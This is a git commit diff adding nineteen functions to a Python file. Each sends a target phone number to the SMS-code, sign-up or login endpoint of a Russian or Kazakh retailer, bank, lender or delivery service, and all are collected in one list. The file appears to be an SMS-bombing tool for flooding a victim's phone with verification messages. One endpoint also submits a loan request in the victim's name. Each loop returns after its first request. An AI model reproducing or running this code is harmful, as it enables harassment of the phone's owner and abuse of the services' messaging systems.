4628d37e0670fc00f1fe9e4fa9b7097612fcf327
Zharov Danil <Danya.Zharov.2006@gmail.com>
2026-06-03 23:10:10 +0300

    update

--- api.py
+++ api.py
@@ -161,6 +161,275 @@ def mm(number,n =1):
         else:
             return '⚠️ Магнит Маркет не отправлено'
 
+def rossko(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://rossko.ru/customer/auth/',
+            data={'action': 'registerByPhone', 'realPhone': f'+7 {number[1:4]} {number[4:7]}-{number[7:9]}-{number[9:11]}'}
+        )
+        if r.status_code == 200:
+            return '✅ Rossko отправлено'
+        else:
+            return '⚠️ Rossko не отправлено'
+        time.sleep(1)
+ 
+ 
+def apteka(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://api.apteka.ru/Auth/Auth_Code',
+            json={'phone': f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:11]}'}
+        )
+        if r.status_code == 200:
+            return '✅ Apteka.ru отправлено'
+        else:
+            return '⚠️ Apteka.ru не отправлено'
+        time.sleep(1)
+ 
+ 
+def magnit(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://id.magnit.ru/v3/auth/signin',
+            json={'phone': number[1:], 'device_id': '66d050cd8fd4e15a'}
+        )
+        if r.status_code == 200:
+            return '✅ Магнит отправлено'
+        else:
+            return '⚠️ Магнит не отправлено'
+        time.sleep(1)
+ 
+ 
+def webbankir(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://ng-api.webbankir.com/api/auth/newCode/',
+            json={'phone': number}
+        )
+        if r.status_code == 200:
+            return '✅ Webbankir отправлено'
+        else:
+            return '⚠️ Webbankir не отправлено'
+        time.sleep(1)
+ 
+ 
+def chetire_lapy(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://4lapy.ru/api/auth/newCode/',
+            json={'phone': number}
+        )
+        if r.status_code == 200:
+            return '✅ 4lapy отправлено'
+        else:
+            return '⚠️ 4lapy не отправлено'
+        time.sleep(1)
+ 
+ 
+def papajohns(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://api.papajohns.ru/user/v2/phone_verification',
+            json={'data': {'type': 'PhoneVerification', 'attributes': {'phone': number, 'webbankirCrossId': '8879b668-4734-4a47-97f0-c9af8b2acf94'}}}
+        )
+        if r.status_code == 200:
+            return '✅ Papa Johns отправлено'
+        else:
+            return '⚠️ Papa Johns не отправлено'
+        time.sleep(1)
+ 
+ 
+def papajohns_signup(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://api.papajohns.ru/v2/users',
+            json={'username': number, 'phone': number, 'app_version': 'v30'}
+        )
+        if r.status_code == 200:
+            return '✅ Papa Johns signup отправлено'
+        else:
+            return '⚠️ Papa Johns signup не отправлено'
+        time.sleep(1)
+ 
+ 
+def valta(number, n=1):
+    formatted = f'+7 {number[1:4]} {number[4:7]}-{number[7:9]}-{number[9:11]}'
+    for _ in range(n):
+        r = post(
+            'https://valta.ru/bitrix/services/main/ajax.php',
+            params={'mode': 'class', 'c': 'citfact:register', 'action': 'sendSms'},
+            data={'phone': formatted}
+        )
+        if r.status_code == 200:
+            return '✅ Valta отправлено'
+        else:
+            return '⚠️ Valta не отправлено'
+        time.sleep(1)
+ 
+ 
+def ecco(number, n=1):
+    formatted = f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:11]}'
+    for _ in range(n):
+        r = post(
+            'https://ecco.ru/ajax/ajax.php',
+            data={
+                'ajax_event': 'set_auth_type',
+                'event': 'ajax',
+                'show_description': '1',
+                'show_register': '1',
+                'auth_type': 'phone',
+                'phone_login': formatted
+            }
+        )
+        if r.status_code == 200:
+            return '✅ ECCO отправлено'
+        else:
+            return '⚠️ ECCO не отправлено'
+        time.sleep(1)
+ 
+ 
+def viled(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://api-prod.viled.kz/identityabo/anonymousFlow/init',
+            json={'phone': number[1:]}
+        )
+        if r.status_code == 200:
+            return '✅ Viled.kz отправлено'
+        else:
+            return '⚠️ Viled.kz не отправлено'
+        time.sleep(1)
+ 
+ 
+def dostavista(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://dostavista.ru/user/send-sms',
+            json={'phone': number, 'source': 'signup'}
+        )
+        if r.status_code == 200:
+            return '✅ Dostavista отправлено'
+        else:
+            return '⚠️ Dostavista не отправлено'
+        time.sleep(1)
+ 
+ 
+def lifemart(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://api.lifemart.ru/api/user/register',
+            json={'verify_type': 'sms', 'phone': number[1:]}
+        )
+        if r.status_code == 200:
+            return '✅ Lifemart отправлено'
+        else:
+            return '⚠️ Lifemart не отправлено'
+        time.sleep(1)
+ 
+ 
+def igooods(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://igooods.ru/v2/otps',
+            json={'phone': number}
+        )
+        if r.status_code == 200:
+            return '✅ iGooods отправлено'
+        else:
+            return '⚠️ iGooods не отправлено'
+        time.sleep(1)
+ 
+ 
+def citydrive(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://citydrive.ru/signup',
+            params={'version': '21'},
+            json={
+                'os': 'web',
+                'phone': number[1:],
+                'phone_code': '7',
+                'vendor_id': 'f7bbe719-2356-465f-8858-da1218847e81'
+            }
+        )
+        if r.status_code == 200:
+            return '✅ CityDrive отправлено'
+        else:
+            return '⚠️ CityDrive не отправлено'
+        time.sleep(1)
+ 
+ 
+def bolshoe_tv(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://bolshoe.tv/v1/agregator/sendAuth',
+            json={'auth_type': 'phone', 'uid': number}
+        )
+        if r.status_code == 200:
+            return '✅ Bolshoe.tv отправлено'
+        else:
+            return '⚠️ Bolshoe.tv не отправлено'
+        time.sleep(1)
+ 
+ 
+def akbars(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://online.akbars.ru/identityabo/anonymousFlow/init',
+            json={'phone': number[1:]}
+        )
+        if r.status_code == 200:
+            return '✅ Akbars отправлено'
+        else:
+            return '⚠️ Akbars не отправлено'
+        time.sleep(1)
+ 
+ 
+def nskbl(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://www.nskbl.ru/api/ext/rshb-auth/send-verification-code-auth',
+            json={'login': f'+{number}'}
+        )
+        if r.status_code == 200:
+            return '✅ NSKBL отправлено'
+        else:
+            return '⚠️ NSKBL не отправлено'
+        time.sleep(1)
+ 
+ 
+def svoefermerstvo(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth',
+            json={'login': f'+{number}'}
+        )
+        if r.status_code == 200:
+            return '✅ Своё Фермерство отправлено'
+        else:
+            return '⚠️ Своё Фермерство не отправлено'
+        time.sleep(1)
+ 
+ 
+def joy_money(number, n=1):
+    for _ in range(n):
+        r = post(
+            'https://my.joy.money/',
+            json={'phone': number, 'amount': '5500', 'days': '12'}
+        )
+        if r.status_code == 200:
+            return '✅ Joy Money отправлено'
+        else:
+            return '⚠️ Joy Money не отправлено'
+        time.sleep(1)
+
+ALL = [
+    rossko, apteka, magnit, webbankir, chetire_lapy,
+    papajohns, papajohns_signup, valta, ecco, viled,
+    dostavista, lifemart, igooods, citydrive, bolshoe_tv,
+    akbars, nskbl, svoefermerstvo, joy_money
+]
+
 
 
 # Изменение формата номера
